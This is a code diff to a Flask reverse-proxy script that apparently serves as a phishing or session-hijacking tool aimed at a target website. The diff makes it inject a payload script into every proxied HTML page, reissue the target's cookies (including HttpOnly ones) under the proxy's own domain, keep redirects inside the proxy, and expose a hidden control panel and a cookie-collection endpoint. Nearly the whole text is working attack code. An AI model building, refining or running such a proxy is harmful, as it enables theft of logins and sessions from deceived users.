@@ -1,4 +1,4 @@
-from flask import Flask, request, Response, send_from_directory, jsonify
+from flask import Flask, request, Response, send_from_directory, jsonify, redirect
 import requests
 import json
 import os
@@ -67,124 +67,108 @@ def start_proxy(target, host, port, secret):
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        print(f"[*] Incoming request: {request.method} {path}")
-        
-        # Handle panel requests
-        if secret in path:
+        if path.startswith(secret):
             if path == secret:
                 return panel_index()
-            elif path.startswith(f"{secret}/"):
-                filename = path[len(f"{secret}/"):]
-                return panel_files(filename)
+            filename = path[len(secret)+1:]
+            return panel_files(filename)
 
-        # Build target URL properly
-        if not path and not request.query_string:
-            target_url = f"https://{target}"
-        else:
-            target_url = f"https://{target}/{path}"
-            if request.query_string:
-                target_url += f"?{request.query_string.decode()}"
-        
-        print(f"[*] Proxying to: {target_url}")
+        # Create session with custom settings
+        session = requests.Session()
+        session.verify = False
+        session.timeout = 10
+
+        # Build target URL
+        target_url = f"https://{target}/{path}"
+        if request.query_string:
+            target_url += f"?{request.query_string.decode()}"
+
+        print(f"{Fore.CYAN}[*] Proxying: {request.method} {target_url}{Fore.RESET}")
 
         try:
-            # Set reasonable timeouts
-            timeout = (5, 15)  # (connect timeout, read timeout)
-            
-            # Preserve original headers and add necessary ones
-            headers = {
-                key: value for key, value in request.headers if key.lower() not in [
-                    'host', 
-                    'content-length',
-                    'connection',
-                ]
-            }
+            # Prepare headers
+            headers = dict(request.headers)
             headers['Host'] = target
-            
-            # Forward the request with all data
-            resp = requests.request(
+            headers.pop('If-None-Match', None)
+            headers.pop('If-Modified-Since', None)
+
+            # Forward the request
+            resp = session.request(
                 method=request.method,
                 url=target_url,
                 headers=headers,
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=True,
-                verify=False,
-                timeout=timeout
+                allow_redirects=False,  # Handle redirects manually
+                timeout=10
             )
+
+            # Handle redirects within our proxy
+            if resp.status_code in [301, 302, 303, 307, 308]:
+                location = resp.headers.get('Location', '')
+                if location.startswith('/'):
+                    location = f"/{location.lstrip('/')}"
+                elif location.startswith(f'https://{target}'):
+                    location = location[len(f'https://{target}'):]
+                return redirect(location, code=resp.status_code)
 
             # Process response headers
-            excluded_headers = [
-                'content-encoding', 
-                'content-length', 
-                'transfer-encoding', 
-                'connection',
-                'strict-transport-security',
-            ]
-            
-            response_headers = [
-                (name, value) 
-                for name, value in resp.raw.headers.items() 
-                if name.lower() not in excluded_headers
-            ]
+            headers = [(name, value) for name, value in resp.headers.items()
+                      if name.lower() not in ['content-length', 'transfer-encoding', 'connection']]
 
-            # Process cookies from response
-            if 'set-cookie' in resp.headers:
-                cookies = resp.headers.getlist('set-cookie')
-                for cookie in cookies:
-                    response_headers.append(('Set-Cookie', cookie))
+            # Process content
+            content = resp.content
+            content_type = resp.headers.get('Content-Type', '').lower()
 
-            # Process and inject payload if HTML
-            content_type = resp.headers.get('Content-Type', '')
-            if 'text/html' in content_type.lower():
+            if 'text/html' in content_type:
                 try:
-                    content = resp.content.decode('utf-8')
-                    
-                    # Inject our payload
+                    decoded = content.decode('utf-8')
                     payload = '<script src="/payload-script.js"></script>'
-                    if '</head>' in content:
-                        content = content.replace('</head>', f'{payload}</head>')
-                    elif '<body>' in content:
-                        content = content.replace('<body>', f'<body>{payload}')
                     
-                    # Fix relative URLs
-                    content = content.replace('href="/', f'href="/{path}' if path else 'href="/')
-                    content = content.replace('src="/', f'src="/{path}' if path else 'src="/')
+                    if '</head>' in decoded:
+                        decoded = decoded.replace('</head>', f'{payload}</head>')
+                    elif '<body>' in decoded:
+                        decoded = decoded.replace('<body>', f'<body>{payload}')
                     
-                    # Fix form actions
-                    content = content.replace('action="/', f'action="/{path}' if path else 'action="/')
+                    # Fix relative paths
+                    decoded = decoded.replace('href="/', 'href="/')
+                    decoded = decoded.replace('src="/', 'src="/')
+                    decoded = decoded.replace('action="/', 'action="/')
                     
-                    return Response(
-                        content.encode('utf-8'),
-                        resp.status_code,
-                        response_headers
-                    )
-                except UnicodeDecodeError:
-                    # If we can't decode the content, return it as-is
-                    return Response(
-                        resp.content,
-                        resp.status_code,
-                        response_headers
-                    )
+                    content = decoded.encode('utf-8')
+                except:
+                    pass  # Use original content if decode fails
 
-            # Return raw response if not HTML or if processing failed
-            return Response(
-                resp.content,
-                resp.status_code,
-                response_headers
-            )
+            response = Response(content, resp.status_code, headers)
+
+            # Copy cookies from response
+            for cookie in resp.cookies:
+                response.set_cookie(
+                    key=cookie.name,
+                    value=cookie.value,
+                    domain=request.host,
+                    path=cookie.path or '/',
+                    secure=cookie.secure,
+                    httponly=cookie.has_nonstandard_attr('HttpOnly'),
+                    samesite=cookie.get_nonstandard_attr('SameSite', 'Lax')
+                )
+
+            return response
 
         except requests.exceptions.Timeout:
             print(f"{Fore.RED}[!] Request timed out for: {target_url}{Fore.RESET}")
             return "Request timed out. Please try again.", 504
-            
+
         except requests.exceptions.ConnectionError:
             print(f"{Fore.RED}[!] Connection error for: {target_url}{Fore.RESET}")
             return "Failed to connect to the target server.", 502
-            
+
         except Exception as e:
             print(f"{Fore.RED}[!] Proxy Error: {str(e)}{Fore.RESET}")
-            return f"An error occurred: {str(e)}", 500
+            return "An error occurred while processing your request.", 500
+
+        finally:
+            session.close()
 
     @app.route('/ep/api/cookies', methods=['POST'])
     def handle_cookies():
